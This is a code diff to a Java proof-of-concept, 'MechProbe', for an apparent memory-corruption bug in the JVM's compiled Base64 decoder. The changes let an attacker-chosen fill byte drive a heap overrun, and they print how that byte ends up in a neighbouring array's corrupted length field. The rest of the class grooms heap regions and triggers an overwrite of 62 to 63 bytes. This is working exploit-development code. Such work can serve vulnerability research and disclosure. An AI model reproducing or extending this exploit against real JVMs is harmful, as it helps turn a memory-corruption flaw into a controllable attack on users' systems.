@@ -80,7 +80,8 @@ public class MechProbe {
         }
 
         if ("segv".equals(mode)) { segvRun(trig); return; }
-        gapRun(trig, gcLog, args);
+        char fill = args.length > 4 && args[4].length()==1 ? args[4].charAt(0) : 'A';
+        gapRun(trig, gcLog, args, fill);
     }
 
     static String[] RuntimeArgs(String[] args) { return args; }
@@ -108,14 +109,14 @@ public class MechProbe {
                 + " (C2 hot, no deopt expected)");
     }
 
-    static byte[] buildTrigger(String trig) {
+    static byte[] buildTrigger(String trig, char fill) {
         // pad1: "A"*(4k)+"="   → len%4=1, r=1, 1 pad  → 64B store, dst=3k+2 → logical overrun 62B
         // pad2: "A"*(4k)+"=="  → len%4=2, r=2, 2 pads → 64B store, dst=3k+1 → logical overrun 63B
         // Both: 4k ≡ 0 (mod 64) → r<4 (bug path); dst obj = 5 regions = gap fit.
         int k = TRIG_K;
         StringBuilder sb = new StringBuilder(4 * k + 2);
         char[] chunk = new char[1 << 16];
-        Arrays.fill(chunk, 'A');
+        Arrays.fill(chunk, fill);
         int left = 4 * k;
         while (left > 0) {
             int n = Math.min(left, chunk.length);
@@ -160,7 +161,7 @@ public class MechProbe {
         return after > 0;
     }
 
-    static void gapRun(String trig, String gcLog, String[] args) throws Exception {
+    static void gapRun(String trig, String gcLog, String[] args, char fill) throws Exception {
         System.out.println("[*] mode=gap trig=" + trig + " nFillers=" + nFillers);
 
         // 0. C2 warmup — the intrinsic fires ONLY from C2-compiled decode0.
@@ -190,7 +191,7 @@ public class MechProbe {
         pumpForCycle(gcLog, 90_000, 3000, "gap-reclaim-pump");
 
         // 5. trigger: dst=byte[3k+1 or 2] (object exactly 5 regions) → lands in the gap
-        byte[] src = buildTrigger(trig);
+        byte[] src = buildTrigger(trig, fill);
         int dstExpect = "pad1".equals(trig) ? 3 * TRIG_K + 2 : 3 * TRIG_K + 1;
         System.out.println("[*] trigger src=" + src.length + " bytes (4k+"
                 + ("pad1".equals(trig) ? 1 : 2) + ", k=TRIG_K), dst expect " + dstExpect
@@ -231,8 +232,11 @@ public class MechProbe {
                 + (markP == markA ? "  (unchanged)" : "  ★CHANGED★"));
         System.out.println("[*] klass  : pristine=0x" + Integer.toHexString(klassP) + "  post=0x" + Integer.toHexString(klassA)
                 + (klassP == klassA ? "  (unchanged)" : "  ★CHANGED★"));
-        System.out.println("[*] length : pristine=" + lenP + "  post=" + lenA
-                + (lenP == lenA ? "  (unchanged)" : "  ★CHANGED (sign " + (lenA < 0 ? "negative" : "positive") + ")★"));
+        System.out.printf("[*] length : pristine=%d  post=%d  bytes=%02x %02x %02x %02x  (fill='%c')%s%n",
+                lenP, lenA, lenA & 0xff, (lenA>>>8)&0xff, (lenA>>>16)&0xff, (lenA>>>24)&0xff, fill,
+                lenP == lenA ? "  (unchanged)" : "  ★CHANGED (sign " + (lenA < 0 ? "negative" : "positive") + ")★");
+        System.out.println("[*] INPUT-DEPENDENCE: length bytes above = decode output of attacker input (fill '" + fill
+                + "'); MSB byte (0x" + String.format("%02x",(lenA>>>24)&0xff) + ") is a decoded base64 byte ∈ [00..ff] → bit31 not forced.");
 
         // byte-exact change map over [0..63] (header 0..15 + body 0..47). Pristine header bytes
         // from the sibling ref; pristine body = CANARY (0xAA).
@@ -306,7 +310,7 @@ public class MechProbe {
     /** Fresh JVM, minimal commit: dst humongous may sit at the committed edge → PROT_NONE → SIGSEGV. */
     static void segvRun(String trig) throws Exception {
         System.out.println("[*] mode=segv — decoding immediately on a fresh small-commit heap");
-        byte[] src = buildTrigger(trig);
+        byte[] src = buildTrigger(trig, 'A');
         System.out.println("[*] trigger src=" + src.length + " bytes");
         try {
             byte[] r = Base64.getDecoder().decode(src);
